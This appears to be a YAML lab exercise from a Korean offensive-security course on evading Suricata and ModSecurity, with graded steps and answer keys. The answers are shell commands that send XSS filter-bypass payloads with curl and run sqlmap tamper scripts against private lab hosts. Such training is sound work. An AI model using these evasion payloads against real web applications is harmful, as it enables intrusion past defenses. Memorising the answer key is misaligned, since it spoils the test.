lab_id: standalone-attack-week10
title: IDS / WAF 우회
version: standalone-non-ai
course: attack
week: 10
description: Suricata + ModSec 의 paranoia / threshold 우회.
difficulty: hard
duration_minutes: 150
prerequisites: [W09]
objectives: [페이로드 변형, tamper, encoding]
pass_threshold: 0.6
steps:
  - order: 1
    instruction: XSS 우회 5 변형
    hint: 다양한 encoding / case / nested
    category: bypass
    points: 30
    answer: |
      ssh 6v6-attacker '
      echo "=== XSS 우회 매트릭스 ==="
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
    answer_detail: 5 우회 매트릭스
    verify:
      type: output_contains
      expect: '4'
      field: stdout
      semantic:
        intent: 우회 패턴
        success_criteria: [5 변형]
        acceptable_methods:
          - "**[OSS] 대소문자 mixing**"
          - "**[OSS] URL encoding**"
          - "**[OSS] HTML entity**"
          - "**[OSS] nested tag (sc<script>ript)**"
          - "**[OSS] 다른 tag (svg/img)**"
          - "**[OSS] event handler 변형**"
          - "**[OSS] unicode escape**"
          - "**[OSS] paranoia 1 → 2 비교**"
    target_vm: attacker

  - order: 2
    instruction: SQLi tamper script 5 종 효과
    hint: sqlmap --tamper=space2comment
    category: bypass
    points: 25
    answer: |
      ssh 6v6-attacker '
      for tamper in "space2comment" "randomcase" "between"; do
        echo "=== $tamper ==="
        timeout 20 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: dvwa.6v6.lab" 2>&1 | tail -3
      done
      ' || ssh 6v6-attacker 'echo "sqlmap timed out"'
    answer_detail: 3 tamper 효과
    verify:
      type: output_contains
      expect: tamper
      field: stdout
      semantic:
        intent: tamper 우회
        success_criteria: [tamper 실행]
        acceptable_methods:
          - "**[OSS] sqlmap --tamper=script 옵션**"
          - "**[OSS] space2comment / randomcase / between**"
          - "**[OSS] 여러 tamper 동시**"
          - "**[OSS] charunicodeescape**"
          - "**[OSS] apostrophenullencode**"
          - "**[OSS] equaltolike**"
          - "**[OSS] custom tamper 작성**"
          - "**[OSS] ModSec paranoia 우회 비율**"
    target_vm: attacker
